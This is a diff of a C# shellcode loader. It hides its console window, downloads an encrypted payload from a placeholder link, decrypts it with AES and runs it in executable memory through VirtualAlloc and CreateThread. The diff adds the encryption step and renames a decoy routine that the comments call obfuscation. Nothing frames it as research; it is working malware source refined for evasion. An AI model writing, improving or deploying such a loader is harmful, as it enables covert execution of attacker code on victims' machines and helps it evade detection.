@@ -2,6 +2,7 @@ using System;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Reflection;
+using System.Security.Cryptography;
 
 class Program
 {
@@ -11,28 +12,60 @@ class Program
         var handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
 
-        // Download 
-        WebClient wc = new WebClient();
-        byte[] shellcode = wc.DownloadData("[DOWNLOAD_LINK]");
+        // Download shellcode
+        byte[] encryptedShellcode = DownloadShellcode("[DOWNLOAD_LINK]");
+        byte[] shellcode = DecryptShellcode(encryptedShellcode);
 
-        // Get VirtualAlloc address and create delegate
-        IntPtr kernel32 = LoadLibrary("kernel32.dll");
-        IntPtr virtualAllocAddr = GetProcAddress(kernel32, "VirtualAlloc");
-        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddr, typeof(VirtualAllocDelegate));
-
-        // Allocate memory 
-        IntPtr allocatedMemory = virtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+        // Allocate memory and copy shellcode
+        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
         Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
 
-        // Create thread to execute
+        // Create thread to execute shellcode
         IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
         WaitForSingleObject(threadHandle, 0xFFFFFFFF);
 
         // Call a random method to obfuscate further
-        callkarbebhai();
+        CallRandomMethod();
     }
 
-    static void callkarbebhai()
+    static byte[] DownloadShellcode(string url)
+    {
+        using (WebClient wc = new WebClient())
+        {
+            return wc.DownloadData(url);
+        }
+    }
+
+    static byte[] DecryptShellcode(byte[] data)
+    {
+        byte[] key = new byte[32]; // Replace with your key
+        byte[] iv = new byte[16]; // Replace with your IV
+
+        using (Aes aes = Aes.Create())
+        {
+            aes.Key = key;
+            aes.IV = iv;
+            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
+            {
+                return PerformCryptography(data, decryptor);
+            }
+        }
+    }
+
+    static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
+    {
+        using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
+        {
+            using (CryptoStream cs = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
+            {
+                cs.Write(data, 0, data.Length);
+                cs.FlushFinalBlock();
+                return ms.ToArray();
+            }
+        }
+    }
+
+    static void CallRandomMethod()
     {
         MethodInfo[] methods = typeof(BenignClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
         Random rand = new Random();
@@ -81,16 +114,16 @@ class BenignClass
 {
     public static void Methodexecuted1()
     {
-        Console.WriteLine("Single but no Available.");
+        Console.WriteLine("Method1 is execoputed.");
     }
 
     public static void Methodexecuted2()
     {
-        Console.WriteLine("ove my Mom dad ");
+        Console.WriteLine("Method2 are execoputed.");
     }
 
     public static void Methodexecuted3()
     {
-        Console.WriteLine("Searching my queen.");
+        Console.WriteLine("Method3 had execoputed.");
     }
 }
